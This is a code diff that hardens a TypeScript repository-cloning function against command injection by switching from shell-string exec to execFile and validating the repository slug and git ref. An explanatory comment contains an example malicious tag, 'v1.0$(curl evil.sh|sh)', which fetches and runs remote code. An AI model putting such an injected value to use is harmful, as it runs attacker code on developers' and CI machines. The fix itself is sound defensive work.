@@ -1,4 +1,4 @@
-import { exec } from "node:child_process";
+import { execFile } from "node:child_process";
 import * as fs from "node:fs/promises";
 import * as path from "node:path";
 import { promisify } from "node:util";
@@ -6,8 +6,9 @@ import { type SimpleGit, simpleGit } from "simple-git";
 import { loadCanonicalRepoConfig } from "../config/loader.js";
 import type { Source } from "../schemas/lockfile.js";
 import { redactGitCredentials } from "../utils/git.js";
+import { assertValidGitRef, assertValidRepositorySlug } from "../utils/repository.js";
 
-const execAsync = promisify(exec);
+const execFileAsync = promisify(execFile);
 
 export interface ResolvedSource {
   source: Source;
@@ -131,10 +132,29 @@ export async function resolveGithubSource(
  * Tries in order: gh CLI, HTTPS with token, plain HTTPS.
  */
 async function cloneRepository(repository: string, ref: string, tempDir: string): Promise<void> {
+  // Both values reach an argument list below, and both cross a trust boundary:
+  // `repository` can come from a committed lockfile, `ref` is whatever tag the
+  // canonical repo's latest release carries. Reject anything malformed before
+  // it is handed to a subprocess or embedded in a clone URL.
+  assertValidRepositorySlug(repository);
+  assertValidGitRef(ref);
+
   // Try gh CLI first (handles auth automatically in CI)
   if (await isGhAvailable()) {
     try {
-      await execAsync(`gh repo clone ${repository} ${tempDir} -- --depth 1 --branch ${ref}`);
+      // Argument array, never a shell string: a release tag like
+      // `v1.0$(curl evil.sh|sh)` is a valid git tag, and `exec` would run it.
+      await execFileAsync("gh", [
+        "repo",
+        "clone",
+        repository,
+        tempDir,
+        "--",
+        "--depth",
+        "1",
+        "--branch",
+        ref,
+      ]);
       return;
     } catch {
       // Expected: gh clone may fail, fall back to git with token auth
@@ -162,7 +182,7 @@ async function cloneRepository(repository: string, ref: string, tempDir: string)
  */
 async function isGhAvailable(): Promise<boolean> {
   try {
-    await execAsync("gh --version");
+    await execFileAsync("gh", ["--version"]);
     return true;
   } catch {
     // Expected: gh CLI not installed
